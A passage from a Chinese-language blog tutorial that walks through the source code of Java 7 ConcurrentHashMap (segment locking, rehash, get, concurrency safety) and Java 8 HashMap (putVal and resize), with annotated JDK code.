segmentShift 的值为 32 – 4 &#x3D; 28，segmentMask 为 16 – 1 &#x3D; 15，姑且把它们简单翻译为移位数和掩码，这两个值马上就会用到。</li></ul><h4 id="put-过程分析-1"><a href="#put-过程分析-1" class="headerlink" title="put 过程分析"></a>put 过程分析</h4><p>我们先看 put 的主流程，对于其中的一些关键细节操作，后面会进行详细介绍。</p><pre class="line-numbers language-none"><code class="language-none">public V put(K key, V value) &#123;    Segment&lt;K,V&gt; s;    if (value &#x3D;&#x3D; null)        throw new NullPointerException();    &#x2F;&#x2F; 1. 计算 key 的 hash 值    int hash &#x3D; hash(key);    &#x2F;&#x2F; 2. 根据 hash 值找到 Segment 数组中的位置 j    &#x2F;&#x2F;    hash 是 32 位，无符号右移 segmentShift(28) 位，剩下低 4 位，    &#x2F;&#x2F;    然后和 segmentMask(15) 做一次与操作，也就是说 j 是 hash 值的最后 4 位，也就是槽的数组下标    int j &#x3D; (hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;    &#x2F;&#x2F; 刚刚说了，初始化的时候初始化了 segment[0]，但是其他位置还是 null，    &#x2F;&#x2F; ensureSegment(j) 对 segment[j] 进行初始化    if ((s &#x3D; (Segment&lt;K,V&gt;)UNSAFE.getObject          &#x2F;&#x2F; nonvolatile; recheck         (segments, (j &lt;&lt; SSHIFT) + SBASE)) &#x3D;&#x3D; null) &#x2F;&#x2F;  in ensureSegment        s &#x3D; ensureSegment(j);    &#x2F;&#x2F; 3. 插入新值到 槽 s 中    return s.put(key, hash, value, false);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一层皮很简单，根据 hash 值很快就能找到相应的 Segment，之后就是 Segment 内部的 put 操作了。</p><p>Segment 内部是由 <strong>数组+链表</strong> 组成的。</p><pre class="line-numbers language-none"><code class="language-none">final V put(K key, int hash, V value, boolean onlyIfAbsent) &#123;    &#x2F;&#x2F; 在往该 segment 写入前，需要先获取该 segment 的独占锁    &#x2F;&#x2F;    先看主流程，后面还会具体介绍这部分内容    HashEntry&lt;K,V&gt; node &#x3D; tryLock() ? null :        scanAndLockForPut(key, hash, value);    V oldValue;    try &#123;        &#x2F;&#x2F; 这个是 segment 内部的数组        HashEntry&lt;K,V&gt;[] tab &#x3D; table;        &#x2F;&#x2F; 再利用 hash 值，求应该放置的数组下标        int index &#x3D; (tab.length - 1) &amp; hash;        &#x2F;&#x2F; first 是数组该位置处的链表的表头        HashEntry&lt;K,V&gt; first &#x3D; entryAt(tab, index);         &#x2F;&#x2F; 下面这串 for 循环虽然很长，不过也很好理解，想想该位置没有任何元素和已经存在一个链表这两种情况        for (HashEntry&lt;K,V&gt; e &#x3D; first;;) &#123;            if (e !&#x3D; null) &#123;                K k;                if ((k &#x3D; e.key) &#x3D;&#x3D; key ||                    (e.hash &#x3D;&#x3D; hash &amp;&amp; key.equals(k))) &#123;                    oldValue &#x3D; e.value;                    if (!onlyIfAbsent) &#123;                        &#x2F;&#x2F; 覆盖旧值                        e.value &#x3D; value;                        ++modCount;                    &#125;                    break;                &#125;                &#x2F;&#x2F; 继续顺着链表走                e &#x3D; e.next;            &#125;            else &#123;                &#x2F;&#x2F; node 到底是不是 null，这个要看获取锁的过程，不过和这里都没有关系。                &#x2F;&#x2F; 如果不为 null，那就直接将它设置为链表表头；如果是null，初始化并设置为链表表头。                if (node !&#x3D; null)                    node.setNext(first);                else                    node &#x3D; new HashEntry&lt;K,V&gt;(hash, key, value, first);                 int c &#x3D; count + 1;                &#x2F;&#x2F; 如果超过了该 segment 的阈值，这个 segment 需要扩容                if (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)                    rehash(node); &#x2F;&#x2F; 扩容后面也会具体分析                else                    &#x2F;&#x2F; 没有达到阈值，将 node 放到数组 tab 的 index 位置，                    &#x2F;&#x2F; 其实就是将新的节点设置成原链表的表头                    setEntryAt(tab, index, node);                ++modCount;                count &#x3D; c;                oldValue &#x3D; null;                break;            &#125;        &#125;    &#125; finally &#123;        &#x2F;&#x2F; 解锁        unlock();    &#125;    return oldValue;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整体流程还是比较简单的，由于有独占锁的保护，所以 segment 内部的操作并不复杂。至于这里面的并发问题，我们稍后再进行介绍。</p><p>到这里 put 操作就结束了，接下来，我们说一说其中几步关键的操作。</p><h6 id="初始化槽-ensureSegment"><a href="#初始化槽-ensureSegment" class="headerlink" title="初始化槽: ensureSegment"></a>初始化槽: ensureSegment</h6><p>ConcurrentHashMap 初始化的时候会初始化第一个槽 segment[0]，对于其他槽来说，在插入第一个值的时候进行初始化。</p><p>这里需要考虑并发，因为很可能会有多个线程同时进来初始化同一个槽 segment[k]，不过只要有一个成功了就可以。</p><pre class="line-numbers language-none"><code class="language-none">private Segment&lt;K,V&gt; ensureSegment(int k) &#123;    final Segment&lt;K,V&gt;[] ss &#x3D; this.segments;    long u &#x3D; (k &lt;&lt; SSHIFT) + SBASE; &#x2F;&#x2F; raw offset    Segment&lt;K,V&gt; seg;    if ((seg &#x3D; (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u)) &#x3D;&#x3D; null) &#123;        &#x2F;&#x2F; 这里看到为什么之前要初始化 segment[0] 了，        &#x2F;&#x2F; 使用当前 segment[0] 处的数组长度和负载因子来初始化 segment[k]        &#x2F;&#x2F; 为什么要用“当前”，因为 segment[0] 可能早就扩容过了        Segment&lt;K,V&gt; proto &#x3D; ss[0];        int cap &#x3D; proto.table.length;        float lf &#x3D; proto.loadFactor;        int threshold &#x3D; (int)(cap * lf);         &#x2F;&#x2F; 初始化 segment[k] 内部的数组        HashEntry&lt;K,V&gt;[] tab &#x3D; (HashEntry&lt;K,V&gt;[])new HashEntry[cap];        if ((seg &#x3D; (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))            &#x3D;&#x3D; null) &#123; &#x2F;&#x2F; 再次检查一遍该槽是否被其他线程初始化了。             Segment&lt;K,V&gt; s &#x3D; new Segment&lt;K,V&gt;(lf, threshold, tab);            &#x2F;&#x2F; 使用 while 循环，内部用 CAS，当前线程成功设值或其他线程成功设值后，退出            while ((seg &#x3D; (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))                   &#x3D;&#x3D; null) &#123;                if (UNSAFE.compareAndSwapObject(ss, u, null, seg &#x3D; s))                    break;            &#125;        &#125;    &#125;    return seg;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总的来说，ensureSegment(int k) 比较简单，对于并发操作使用 CAS 进行控制。</p><blockquote><p>如果当前线程 CAS 失败，这里的 while 循环是为了将 seg 赋值返回。</p></blockquote><h6 id="获取写入锁-scanAndLockForPut"><a href="#获取写入锁-scanAndLockForPut" class="headerlink" title="获取写入锁: scanAndLockForPut"></a>获取写入锁: scanAndLockForPut</h6><p>前面我们看到，在往某个 segment 中 put 的时候，首先会调用 node &#x3D; tryLock() ? null : scanAndLockForPut(key, hash, value)，也就是说先进行一次 tryLock() 快速获取该 segment 的独占锁，如果失败，那么进入到 scanAndLockForPut 这个方法来获取锁。</p><p>下面我们来具体分析这个方法中是怎么控制加锁的。</p><pre class="line-numbers language-none"><code class="language-none">private HashEntry&lt;K,V&gt; scanAndLockForPut(K key, int hash, V value) &#123;    HashEntry&lt;K,V&gt; first &#x3D; entryForHash(this, hash);    HashEntry&lt;K,V&gt; e &#x3D; first;    HashEntry&lt;K,V&gt; node &#x3D; null;    int retries &#x3D; -1; &#x2F;&#x2F; negative while locating node     &#x2F;&#x2F; 循环获取锁    while (!tryLock()) &#123;        HashEntry&lt;K,V&gt; f; &#x2F;&#x2F; to recheck first below        if (retries &lt; 0) &#123;            if (e &#x3D;&#x3D; null) &#123;                if (node &#x3D;&#x3D; null) &#x2F;&#x2F; speculatively create node                    &#x2F;&#x2F; 进到这里说明数组该位置的链表是空的，没有任何元素                    &#x2F;&#x2F; 当然，进到这里的另一个原因是 tryLock() 失败，所以该槽存在并发，不一定是该位置                    node &#x3D; new HashEntry&lt;K,V&gt;(hash, key, value, null);                retries &#x3D; 0;            &#125;            else if (key.equals(e.key))                retries &#x3D; 0;            else                &#x2F;&#x2F; 顺着链表往下走                e &#x3D; e.next;        &#125;        &#x2F;&#x2F; 重试次数如果超过 MAX_SCAN_RETRIES（单核1多核64），那么不抢了，进入到阻塞队列等待锁        &#x2F;&#x2F;    lock() 是阻塞方法，直到获取锁后返回        else if (++retries &gt; MAX_SCAN_RETRIES) &#123;            lock();            break;        &#125;        else if ((retries &amp; 1) &#x3D;&#x3D; 0 &amp;&amp;                 &#x2F;&#x2F; 这个时候是有大问题了，那就是有新的元素进到了链表，成为了新的表头                 &#x2F;&#x2F;     所以这边的策略是，相当于重新走一遍这个 scanAndLockForPut 方法                 (f &#x3D; entryForHash(this, hash)) !&#x3D; first) &#123;            e &#x3D; first &#x3D; f; &#x2F;&#x2F; re-traverse if entry changed            retries &#x3D; -1;        &#125;    &#125;    return node;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法有两个出口，一个是 tryLock() 成功了，循环终止，另一个就是重试次数超过了 MAX_SCAN_RETRIES，进到 lock() 方法，此方法会阻塞等待，直到成功拿到独占锁。</p><p>这个方法就是看似复杂，但是其实就是做了一件事，那就是<strong>获取该 segment 的独占锁</strong>，如果需要的话顺便实例化了一下 node。</p><h6 id="扩容-rehash"><a href="#扩容-rehash" class="headerlink" title="扩容: rehash"></a>扩容: rehash</h6><p>重复一下，segment 数组不能扩容，扩容是 segment 数组某个位置内部的数组 HashEntry[] 进行扩容，扩容后，容量为原来的 2 倍。</p><p>首先，我们要回顾一下触发扩容的地方，put 的时候，如果判断该值的插入会导致该 segment 的元素个数超过阈值，那么先进行扩容，再插值，读者这个时候可以回去 put 方法看一眼。</p><p>该方法不需要考虑并发，因为到这里的时候，是持有该 segment 的独占锁的。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 方法参数上的 node 是这次扩容后，需要添加到新的数组中的数据。private void rehash(HashEntry&lt;K,V&gt; node) &#123;    HashEntry&lt;K,V&gt;[] oldTable &#x3D; table;    int oldCapacity &#x3D; oldTable.length;    &#x2F;&#x2F; 2 倍    int newCapacity &#x3D; oldCapacity &lt;&lt; 1;    threshold &#x3D; (int)(newCapacity * loadFactor);    &#x2F;&#x2F; 创建新数组    HashEntry&lt;K,V&gt;[] newTable &#x3D;        (HashEntry&lt;K,V&gt;[]) new HashEntry[newCapacity];    &#x2F;&#x2F; 新的掩码，如从 16 扩容到 32，那么 sizeMask 为 31，对应二进制 ‘000...00011111’    int sizeMask &#x3D; newCapacity - 1;     &#x2F;&#x2F; 遍历原数组，老套路，将原数组位置 i 处的链表拆分到 新数组位置 i 和 i+oldCap 两个位置    for (int i &#x3D; 0; i &lt; oldCapacity ; i++) &#123;        &#x2F;&#x2F; e 是链表的第一个元素        HashEntry&lt;K,V&gt; e &#x3D; oldTable[i];        if (e !&#x3D; null) &#123;            HashEntry&lt;K,V&gt; next &#x3D; e.next;            &#x2F;&#x2F; 计算应该放置在新数组中的位置，            &#x2F;&#x2F; 假设原数组长度为 16，e 在 oldTable[3] 处，那么 idx 只可能是 3 或者是 3 + 16 &#x3D; 19            int idx &#x3D; e.hash &amp; sizeMask;            if (next &#x3D;&#x3D; null)   &#x2F;&#x2F; 该位置处只有一个元素，那比较好办                newTable[idx] &#x3D; e;            else &#123; &#x2F;&#x2F; Reuse consecutive sequence at same slot                &#x2F;&#x2F; e 是链表表头                HashEntry&lt;K,V&gt; lastRun &#x3D; e;                &#x2F;&#x2F; idx 是当前链表的头结点 e 的新位置                int lastIdx &#x3D; idx;                 &#x2F;&#x2F; 下面这个 for 循环会找到一个 lastRun 节点，这个节点之后的所有元素是将要放到一起的                for (HashEntry&lt;K,V&gt; last &#x3D; next;                     last !&#x3D; null;                     last &#x3D; last.next) &#123;                    int k &#x3D; last.hash &amp; sizeMask;                    if (k !&#x3D; lastIdx) &#123;                        lastIdx &#x3D; k;                        lastRun &#x3D; last;                    &#125;                &#125;                &#x2F;&#x2F; 将 lastRun 及其之后的所有节点组成的这个链表放到 lastIdx 这个位置                newTable[lastIdx] &#x3D; lastRun;                &#x2F;&#x2F; 下面的操作是处理 lastRun 之前的节点，                &#x2F;&#x2F;    这些节点可能分配在另一个链表中，也可能分配到上面的那个链表中                for (HashEntry&lt;K,V&gt; p &#x3D; e; p !&#x3D; lastRun; p &#x3D; p.next) &#123;                    V v &#x3D; p.value;                    int h &#x3D; p.hash;                    int k &#x3D; h &amp; sizeMask;                    HashEntry&lt;K,V&gt; n &#x3D; newTable[k];                    newTable[k] &#x3D; new HashEntry&lt;K,V&gt;(h, p.key, v, n);                &#125;            &#125;        &#125;    &#125;    &#x2F;&#x2F; 将新来的 node 放到新数组中刚刚的 两个链表之一 的 头部    int nodeIndex &#x3D; node.hash &amp; sizeMask; &#x2F;&#x2F; add the new node    node.setNext(newTable[nodeIndex]);    newTable[nodeIndex] &#x3D; node;    table &#x3D; newTable;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的扩容比之前的 HashMap 要复杂一些，代码难懂一点。上面有两个挨着的 for 循环，第一个 for 有什么用呢？</p><p>仔细一看发现，如果没有第一个 for 循环，也是可以工作的，但是，这个 for 循环下来，如果 lastRun 的后面还有比较多的节点，那么这次就是值得的。因为我们只需要克隆 lastRun 前面的节点，后面的一串节点跟着 lastRun 走就是了，不需要做任何操作。</p><p>我觉得 Doug Lea 的这个想法也是挺有意思的，不过比较坏的情况就是每次 lastRun 都是链表的最后一个元素或者很靠后的元素，那么这次遍历就有点浪费了。<strong>不过 Doug Lea 也说了，根据统计，如果使用默认的阈值，大约只有 1&#x2F;6 的节点需要克隆。</strong></p><h4 id="get-过程分析-1"><a href="#get-过程分析-1" class="headerlink" title="get 过程分析"></a>get 过程分析</h4><p>相对于 put 来说，get 真的不要太简单。</p><ol><li>计算 hash 值，找到 segment 数组中的具体位置，或我们前面用的“槽”</li><li>槽中也是一个数组，根据 hash 找到数组中具体的位置</li><li>到这里是链表了，顺着链表进行查找即可</li></ol><pre class="line-numbers language-none"><code class="language-none">public V get(Object key) &#123;    Segment&lt;K,V&gt; s; &#x2F;&#x2F; manually integrate access methods to reduce overhead    HashEntry&lt;K,V&gt;[] tab;    &#x2F;&#x2F; 1. hash 值    int h &#x3D; hash(key);    long u &#x3D; (((h &gt;&gt;&gt; segmentShift) &amp; segmentMask) &lt;&lt; SSHIFT) + SBASE;    &#x2F;&#x2F; 2. 根据 hash 找到对应的 segment    if ((s &#x3D; (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(segments, u)) !&#x3D; null &amp;&amp;        (tab &#x3D; s.table) !&#x3D; null) &#123;        &#x2F;&#x2F; 3. 找到segment 内部数组相应位置的链表，遍历        for (HashEntry&lt;K,V&gt; e &#x3D; (HashEntry&lt;K,V&gt;) UNSAFE.getObjectVolatile                 (tab, ((long)(((tab.length - 1) &amp; h)) &lt;&lt; TSHIFT) + TBASE);             e !&#x3D; null; e &#x3D; e.next) &#123;            K k;            if ((k &#x3D; e.key) &#x3D;&#x3D; key || (e.hash &#x3D;&#x3D; h &amp;&amp; key.equals(k)))                return e.value;        &#125;    &#125;    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="并发问题分析"><a href="#并发问题分析" class="headerlink" title="并发问题分析"></a>并发问题分析</h4><p>现在我们已经说完了 put 过程和 get 过程，我们可以看到 get 过程中是没有加锁的，那自然我们就需要去考虑并发问题。</p><p>添加节点的操作 put 和删除节点的操作 remove 都是要加 segment 上的独占锁的，所以它们之间自然不会有问题，我们需要考虑的问题就是 get 的时候在同一个 segment 中发生了 put 或 remove 操作。推荐阅读：<a href="https://mp.weixin.qq.com/s/Q5F604CUM_0x2co9mvADxw">30 个 Java 集合面试问题及答案</a>。</p><ul><li><strong>put 操作的线程安全性</strong></li></ul><ol><li>初始化槽，这个我们之前就说过了，使用了 CAS 来初始化 Segment 中的数组。</li><li>添加节点到链表的操作是插入到表头的，所以，如果这个时候 get 操作在链表遍历的过程已经到了中间，是不会影响的。当然，另一个并发问题就是 get 操作在 put 之后，需要保证刚刚插入表头的节点被读取，这个依赖于 setEntryAt 方法中使用的 UNSAFE.putOrderedObject。</li><li>扩容。扩容是新创建了数组，然后进行迁移数据，最后面将 newTable 设置给属性 table。所以，如果 get 操作此时也在进行，那么也没关系，如果 get 先行，那么就是在旧的 table 上做查询操作；而 put 先行，那么 put 操作的可见性保证就是 table 使用了 volatile 关键字。</li></ol><ul><li><strong>remove 操作的线程安全性</strong></li></ul><p>remove 操作我们没有分析源码，所以这里说的读者感兴趣的话还是需要到源码中去求实一下的。</p><p>get 操作需要遍历链表，但是 remove 操作会”破坏”链表。</p><p>如果 remove 破坏的节点 get 操作已经过去了，那么这里不存在任何问题。</p><p>如果 remove 先破坏了一个节点，分两种情况考虑。</p><p>1、如果此节点是头结点，那么需要将头结点的 next 设置为数组该位置的元素，table 虽然使用了 volatile 修饰，但是 volatile 并不能提供数组内部操作的可见性保证，所以源码中使用了 UNSAFE 来操作数组，请看方法 setEntryAt。</p><p>2、如果要删除的节点不是头结点，它会将要删除节点的后继节点接到前驱节点中，这里的并发保证就是 next 属性是 volatile 的。推荐阅读：<a href="https://mp.weixin.qq.com/s/0CI9od4DIxRrmOGFJw0SuQ">史上最全 Java 多线程面试题及答案</a>。</p><h2 id="Java8-HashMap"><a href="#Java8-HashMap" class="headerlink" title="Java8 HashMap"></a>Java8 HashMap</h2><p>Java8 对 HashMap 进行了一些修改，最大的不同就是利用了红黑树，所以其由 <strong>数组+链表+红黑树</strong> 组成。</p><p>根据 Java7 HashMap 的介绍，我们知道，查找的时候，根据 hash 值我们能够快速定位到数组的具体下标，但是之后的话，需要顺着链表一个个比较下去才能找到我们需要的，时间复杂度取决于链表的长度，为 **O(n)**。</p><p>为了降低这部分的开销，在 Java8 中，当链表中的元素超过了 8 个以后，会将链表转换为红黑树，在这些位置进行查找的时候可以降低时间复杂度为 O(logN)。</p><p>来一张图简单示意一下吧：</p><p><img src="http://qianniu.javastack.cn/18-12-4/75398751.jpg"></p><blockquote><p>注意，上图是示意图，主要是描述结构，不会达到这个状态的，因为这么多数据的时候早就扩容了。</p></blockquote><p>下面，我们还是用代码来介绍吧，个人感觉，Java8 的源码可读性要差一些，不过精简一些。</p><p>Java7 中使用 Entry 来代表每个 HashMap 中的数据节点，Java8 中使用 <strong>Node</strong>，基本没有区别，都是 key，value，hash 和 next 这四个属性，不过，Node 只能用于链表的情况，红黑树的情况需要使用 <strong>TreeNode</strong>。</p><p>我们根据数组元素中，第一个节点数据类型是 Node 还是 TreeNode 来判断该位置下是链表还是红黑树的。推荐阅读：<a href="https://mp.weixin.qq.com/s/Q5F604CUM_0x2co9mvADxw">30 个 Java 集合面试问题及答案</a>。</p><h4 id="put-过程分析-2"><a href="#put-过程分析-2" class="headerlink" title="put 过程分析"></a>put 过程分析</h4><pre class="line-numbers language-none"><code class="language-none">public V put(K key, V value) &#123;    return putVal(hash(key), key, value, false, true);&#125; &#x2F;&#x2F; 第三个参数 onlyIfAbsent 如果是 true，那么只有在不存在该 key 时才会进行 put 操作&#x2F;&#x2F; 第四个参数 evict 我们这里不关心final V putVal(int hash, K key, V value, boolean onlyIfAbsent,               boolean evict) &#123;    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;    &#x2F;&#x2F; 第一次 put 值的时候，会触发下面的 resize()，类似 java7 的第一次 put 也要初始化数组长度    &#x2F;&#x2F; 第一次 resize 和后续的扩容有些不一样，因为这次是数组从 null 初始化到默认的 16 或自定义的初始容量    if ((tab &#x3D; table) &#x3D;&#x3D; null || (n &#x3D; tab.length) &#x3D;&#x3D; 0)        n &#x3D; (tab &#x3D; resize()).length;    &#x2F;&#x2F; 找到具体的数组下标，如果此位置没有值，那么直接初始化一下 Node 并放置在这个位置就可以了    if ((p &#x3D; tab[i &#x3D; (n - 1) &amp; hash]) &#x3D;&#x3D; null)        tab[i] &#x3D; newNode(hash, key, value, null);     else &#123;&#x2F;&#x2F; 数组该位置有数据        Node&lt;K,V&gt; e; K k;        &#x2F;&#x2F; 首先，判断该位置的第一个数据和我们要插入的数据，key 是不是&quot;相等&quot;，如果是，取出这个节点        if (p.hash &#x3D;&#x3D; hash &amp;&amp;            ((k &#x3D; p.key) &#x3D;&#x3D; key || (key !&#x3D; null &amp;&amp; key.equals(k))))            e &#x3D; p;        &#x2F;&#x2F; 如果该节点是代表红黑树的节点，调用红黑树的插值方法，本文不展开说红黑树        else if (p instanceof TreeNode)            e &#x3D; ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);        else &#123;            &#x2F;&#x2F; 到这里，说明数组该位置上是一个链表            for (int binCount &#x3D; 0; ; ++binCount) &#123;                &#x2F;&#x2F; 插入到链表的最后面(Java7 是插入到链表的最前面)                if ((e &#x3D; p.next) &#x3D;&#x3D; null) &#123;                    p.next &#x3D; newNode(hash, key, value, null);                    &#x2F;&#x2F; TREEIFY_THRESHOLD 为 8，所以，如果新插入的值是链表中的第 9 个                    &#x2F;&#x2F; 会触发下面的 treeifyBin，也就是将链表转换为红黑树                    if (binCount &gt;&#x3D; TREEIFY_THRESHOLD - 1) &#x2F;&#x2F; -1 for 1st                        treeifyBin(tab, hash);                    break;                &#125;                &#x2F;&#x2F; 如果在该链表中找到了&quot;相等&quot;的 key(&#x3D;&#x3D; 或 equals)                if (e.hash &#x3D;&#x3D; hash &amp;&amp;                    ((k &#x3D; e.key) &#x3D;&#x3D; key || (key !&#x3D; null &amp;&amp; key.equals(k))))                    &#x2F;&#x2F; 此时 break，那么 e 为链表中[与要插入的新值的 key &quot;相等&quot;]的 node                    break;                p &#x3D; e;            &#125;        &#125;        &#x2F;&#x2F; e!&#x3D;null 说明存在旧值的key与要插入的key&quot;相等&quot;        &#x2F;&#x2F; 对于我们分析的put操作，下面这个 if 其实就是进行 &quot;值覆盖&quot;，然后返回旧值        if (e !&#x3D; null) &#123;            V oldValue &#x3D; e.value;            if (!onlyIfAbsent || oldValue &#x3D;&#x3D; null)                e.value &#x3D; value;            afterNodeAccess(e);            return oldValue;        &#125;    &#125;    ++modCount;    &#x2F;&#x2F; 如果 HashMap 由于新插入这个值导致 size 已经超过了阈值，需要进行扩容    if (++size &gt; threshold)        resize();    afterNodeInsertion(evict);    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和 Java7 稍微有点不一样的地方就是，Java7 是先扩容后插入新值的，Java8 先插值再扩容，不过这个不重要。</p><h6 id="数组扩容-1"><a href="#数组扩容-1" class="headerlink" title="数组扩容"></a>数组扩容</h6><p>resize() 方法用于<strong>初始化数组或数组扩容</strong>，每次扩容后，容量为原来的 2 倍，并进行数据迁移。</p><pre class="line-numbers language-none"><code class="language-none">final Node&lt;K,V&gt;[] resize() &#123;    Node&lt;K,V&gt;[] oldTab &#x3D; table;    int oldCap &#x3D; (oldTab &#x3D;&#x3D; null) ? 0 : oldTab.length;    int oldThr &#x3D; threshold;    int newCap, newThr &#x3D; 0;    if (oldCap &gt; 0) &#123; &#x2F;&#x2F; 对应数组扩容        if (oldCap &gt;&#x3D; MAXIMUM_CAPACITY) &#123;            threshold &#x3D; Integer.MAX_VALUE;            return oldTab;        &#125;        &#x2F;&#x2F; 将数组大小扩大一倍        else if ((newCap &#x3D; oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp;                 oldCap &gt;&#x3D; DEFAULT_INITIAL_CAPACITY)            &#x2F;&#x2F; 将阈值扩大一倍            newThr &#x3D; oldThr &lt;&lt; 1; &#x2F;&#x2F; double threshold    &#125;    else if (oldThr &gt; 0) &#x2F;&#x2F; 对应使用 new HashMap(int initialCapacity) 初始化后，第一次 put 的时候        newCap &#x3D; oldThr;    else &#123;&#x2F;&#x2F; 对应使用 new HashMap() 初始化后，第一次 put 的时候        newCap &#x3D; DEFAULT_INITIAL_CAPACITY;        newThr &#x3D; (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);    &#125;     if (newThr &#x3D;&#x3D; 0) &#123;        float ft &#x3D; (float)newCap * loadFactor;        newThr &#x3D; (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ?                  (int)ft : Integer.MAX_VALUE);    &#125;    threshold &#x3D; newThr;     &#x2F;&#x2F; 用新的数组大小初始化新的数组    Node&lt;K,V&gt;[] newTab &#x3D; (Node&lt;K,V&gt;[])new Node[newCap];    table &#x3D; newTab; &#x2F;&#x2F; 如果是初始化数组，到这里就结束了，返回 newTab 即可     if (oldTab !&#x3D; null) &#123;        &#x2F;&#x2F; 开始遍历原数组，进行数据迁移。        for (int j &#x3D; 0; j &lt; oldCap; ++j) &#123;            Node&lt;K,V&gt; e;            if ((e &#x3D; oldTab[j]) !&#x3D; null) &#123;                oldTab[j] &#x3D; null;                &#x2F;&#x2F; 如果该数组位置上只有单个元素，那就简单了，简单迁移这个元素就可以了                if (e.next &#x3D;&#x3D; null)                    newTab[e.hash &amp; (newCap - 1)] &#x3D; e;                &#x2F;&#x2F; 如果是红黑树，具体我们就不展开了                else if (e instanceof TreeNode)                    ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap);                else &#123;                     &#x2F;&#x2F; 这块是处理链表的情况，                    &#x2F;&#x2F; 需要将此链表拆成两个链表，放到新的数组中，并且保留原来的先后顺序                    &#x2F;&#x2F; loHead、loTail 对应一条链表，hiHead、hiTail 对应另一条链表，代码还是比较简单的                    Node&lt;K,V&gt; loHead &#x3D; null, loTail &#x3D; null;                    Node&lt;K,V&gt; hiHead &#x3D; null, hiTail &#x3D; null;                    Node&lt;K,V&gt; next;                    do &#123;                        next &#x3D; e.next;                        if ((e.hash &amp; oldCap) &#x3D;&#x3D; 0) &#123;                            if (loTail &#x3D;&#x3D; null)                                loHead &#x3D; e;                            else                                loTail.next &#x3D; e;                            loTail &#x3D; e;                        &#125;                        else &#123;                            if (hiTail &#x3D;&#x3D; null)                                hiHead &#x3D; e;                            else                                hiTail.next &#x3D; e;                            hiTail &#x3D; e;                        &#125;                    &#125; while ((e &#x3D; next) !&#x3D; null);                    if (loTail !&#x3D; null) &#123;                        loTail.next &#x3D; null;                        &#x2F;&#x2F; 第一条链表                        newTab[j] &#x3D; loHead;                    &#125;                    if (hiTail !&#x3D; null) &#123;                        hiTail.next &#x3D; null;                        &#x2F;&#x2F; 第二条链表的新的位置是 j + oldCap，这个很好理解                        newTab[j + oldCap] &#x3D; hiHead;                    &#125;                &#125;            &#125;        &#125;    &#125;    return newTab;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code>